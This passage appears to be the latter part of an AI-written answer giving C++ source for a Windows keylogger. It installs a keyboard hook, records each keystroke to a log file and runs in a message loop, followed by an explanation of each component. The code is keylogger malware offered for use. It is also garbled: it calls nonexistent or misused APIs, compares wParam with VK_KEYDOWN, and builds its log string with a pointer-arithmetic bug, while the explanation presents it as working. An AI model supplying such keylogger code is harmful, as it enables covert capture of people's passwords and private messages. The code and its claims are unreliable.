        byte modifiers = GetAsyncKeyState(0x00);
        bool control = (modifiers & 0x10) ? true : false;
        bool shift = (modifiers & 0x20) ? true : false;
        bool alt = (modifiers & 0x40) ? true : false;

        if (wParam == VK_KEYDOWN) {
            // Convert key to character
            char c = 0;
            if (wParam == 0x1C) c = ' ';
            else if (wParam > 0x1F && wParam < 0x7E) c = static_cast<char>(wParam);
            string key = "Key: " + c;
            writeLog(key);
        }
    }
    return CallNextHook(nCode, wParam, lParam);
}

// Initialize the keyboard hook
bool initializeHook() {
    hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    hook = SetWindowsHook(WH_KEYBOARD, KeyPress);
    hookID = GetWindowThread(hwnd);
    isHooked = true;
    return true;
}

// Uninstall the keyboard hook
void uninstallHook() {
    if (isHooked && hook) {
        isHooked = false;
        UnhookKeyboard(hook, hookID);
    }
}

// Main function
int main() {
    if (!initializeHook()) {
        cout << "Failed to initialize keyboard hook." << endl;
        return 1;
    }

    // Event loop to keep the program running
    while (true) {
        Sleep(100);
        // Check for any pending events
        MSG msg;
        GetMessage(&msg, hwnd, 0, 0);
        if (msg.message == MSG_QneRelease) break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    uninstallHook();
    cout << "Keyboard hook has been removed." << endl;
    return 0;
}
```

### Explanation

- **Headers and Variables**: The code includes necessary Windows API headers and declares global variables to manage the hook.
- **Hook Setup**: The `initializeHook` function sets up the keyboard hook using `SetWindowsHook` and retrieves the current foreground window.
- **Callback Function**: `KeyPress` checks for key events and logs each keystroke, including modifier states, to a file.
- **Event Loop**: The main loop keeps the application running and processes Windows messages to ensure smooth operation.
- **Cleanup**: After the hook is no longer needed, it is uninstalled to release system resources.

